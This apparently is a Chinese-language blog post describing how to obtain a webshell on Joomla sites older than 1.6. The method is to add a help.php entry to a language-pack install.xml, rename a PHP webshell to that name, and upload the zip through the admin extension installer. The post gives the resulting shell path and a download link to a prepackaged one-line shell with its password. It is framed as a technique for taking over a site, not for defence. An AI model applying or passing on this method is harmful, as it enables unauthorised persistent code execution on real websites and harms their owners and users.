---
id: 131
title: Joomla 1.6之前版本后台拿shell的一种方法
date: 2015-03-06T21:27:37+00:00
author: admin
layout: post
guid: http://www.ikow.cn/?p=131
permalink: /joomla-getwebshell/
categories:
  - WEB
tags:
  - joomla
  - webshell
  - 后台
  - 拿shell
---
<img src="http://kowapp.u.qiniudn.com/joomla.jpg" alt="" border="0" />

在后台<a>Extensions&#8211;>install&#8211;></a>Upload Package File的地方可以上传zip的压缩包，然后根据压缩包中install.xml对包中的文件进行解压缩安装

install.xml：

<pre class="brush:xml; toolbar: true; auto-links: true;">&lt;?xml version="1.0" encoding="utf-8"?&gt;

&lt;install type="language" version="1.6" client="administrator" method="upgrade"&gt;

&lt;name&gt;简体中文&lt;/name&gt;

&lt;tag&gt;zh-CN&lt;/tag&gt;

&lt;version&gt;1.6.1&lt;/version&gt;

&lt;creationDate&gt;2011-03-08&lt;/creationDate&gt;

&lt;author&gt;Derek Joe(zhous)&lt;/author&gt;

&lt;authorEmail&gt;zhous1998@sohu.com&lt;/authorEmail&gt;

&lt;authorurl&gt;www.joomla.cn&lt;/authorurl&gt;

&lt;copyright&gt;Copyright (C) 2010 CHN Joomla Translation (http://joomlacode.org/gf/project/choice/). All rights reserved.&lt;/copyright&gt;

&lt;license&gt;GNU General Public License version 2 or later; see LICENSE.txt&lt;/license&gt;

&lt;description&gt;

&lt;/description&gt;

&lt;files&gt;

&lt;filename&gt;index.html&lt;/filename&gt;

&lt;filename&gt;zh-CN.com_admin.ini&lt;/filename&gt;

&lt;filename&gt;zh-CN.com_admin.sys.ini&lt;/filename&gt;

&lt;filename&gt;zh-CN.com_banners.ini&lt;/filename&gt;

&lt;filename&gt;zh-CN.com_banners.sys.ini&lt;/filename&gt;

&lt;filename&gt;zh-CN.com_cache.ini&lt;/filename&gt;

&lt;filename&gt;zh-CN.com_cache.sys.ini&lt;/filename&gt;

&lt;filename&gt;zh-CN.com_categories.ini&lt;/filename&gt;

&lt;filename&gt;zh-CN.com_categories.sys.ini&lt;/filename&gt;

&lt;filename&gt;zh-CN.com_checkin.ini&lt;/filename&gt;

&lt;filename&gt;zh-CN.com_checkin.sys.ini&lt;/filename&gt;

&lt;filename&gt;zh-CN.com_config.ini&lt;/filename&gt;

&lt;filename&gt;zh-CN.com_config.sys.ini&lt;/filename&gt;

&lt;filename&gt;zh-CN.com_contact.ini&lt;/filename&gt;

&lt;filename&gt;zh-CN.com_contact.sys.ini&lt;/filename&gt;

&lt;filename&gt;zh-CN.com_content.ini&lt;/filename&gt;

&lt;filename&gt;zh-CN.com_content.sys.ini&lt;/filename&gt;

&lt;filename&gt;zh-CN.com_cpanel.ini&lt;/filename&gt;</pre>

我们在其中添加

<pre class="brush:xml; toolbar: true; auto-links: true;">&lt;filename&gt;help.php&lt;/filename&gt;</pre>

然后在将webshell重命名为help.php

把所有文件重新打包成zip格式，上传安装

于是我们成功获得了webshell：

http://www.xxoo.com/language/zh-CH/help.php   (并非网上流传的http://xxxx.com/administrator/language/zh-CN/xxxxxx.php)

下面是已经打包好的zip文件：

http://pan.baidu.com/s/1hqsz9mk

其中help.php为一句话shell，密码为 kow

&nbsp;

&nbsp;